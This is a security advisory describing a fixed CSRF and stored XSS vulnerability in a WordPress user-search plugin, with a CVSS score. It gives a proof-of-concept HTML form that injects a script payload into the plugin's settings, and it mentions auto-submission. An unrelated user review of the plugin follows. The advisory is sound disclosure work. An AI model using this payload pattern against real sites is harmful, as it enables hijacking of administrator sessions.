## Advisory:

# CSRF and XSS in Improved user search allow execution of arbitrary javascript in WordPress admin area

## Vulnerability

Last revised: July 30, 2014

If an attacker can trick an admin (via spearphishing for instance) into following a link they will be able to inject arbitrary JavaScript into the admin interface meaning that their code will be executed by an admin’s browser and will be able to do almost anything an admin user can do (create users, delete posts, etc).

Current state:
 Fixed

## CVSS Summary

CVSS base scores for this vulnerability
| Score 6.8 Medium | |
| --- | --- |
| Vector | Network |
| Complexity | Medium |
| Authentication | None |
| Confidentiality | Partial |
| Integrity | Partial |
| Availability | Partial |

You can read more about CVSS base scores on [Wikipedia](http://en.wikipedia.org/wiki/CVSS) or in the [CVSS specification](http://www.first.org/cvss/cvss-guide).

## Proof of concept

Submission of this form on a malicious page visited by an administrator will activate a stored XSS. Some browsers will run alert(1) immediately but if you use a browser which attempts to block reflected XSS you will have to reload the page.

```
<form action="http://localhost/wp-admin/options-general.php?page=improved-user-search-in-backend/improved-user-search-in-backend.php" method="POST">
  <input type="text" name="iusib_meta_fields" value="&lt;/textarea>&lt;script>alert(1)&lt;/script>">
  <input type="text" name="improved_user_search_in_backend_update" value="true">
  <input type="submit">
</form>

Note that no interaction with the malicious page is necessary, as the form itself can be submitted via Javascript. The only action required is to trick the administrator into visiting the page.
```

### [FINALLY!!!](https://wordpress.org/support/topic/finally-156/)

[Arial Burnz](https://profiles.wordpress.org/arialburnz/ "Posts by Arial Burnz")
February 8, 2017

I am FLABBERGASTED that WordPress’s search doesn’t operate like any other search should. I read a thread where the moderator, in essence, said, “Too bad it doesn’t work the way you’re used to. It works the way it’s supposed to for internet web search standards.” (Here’s the thread: https://wordpress.org/support/topic/using-user-search?replies=23).
I can’t believe it took me so long to search for a plugin to fix this problem, but I think I was so bent on the idea, “WHY DO I HAVE TO INSTALL A PLUGIN TO FIX SOMETHING THAT SHOULD BE WORKING RIGHT IN THE FIRST PLACE.” I held onto that way too long!!
THANK YOU THANK YOU THANK YOU for making this plugin! It works PERFECTLY and there’s no special screen I have to go to to do my search. I just go to the Users utility and search for what I need…as it should be! Thanks for doing this in the backend and improving the functionality without having to go through hoops to use it.
THANK YOU THANK YOU THANK YOU!!! HIGHLY recommend this plugin as a standard install for any WordPress site.
Best,
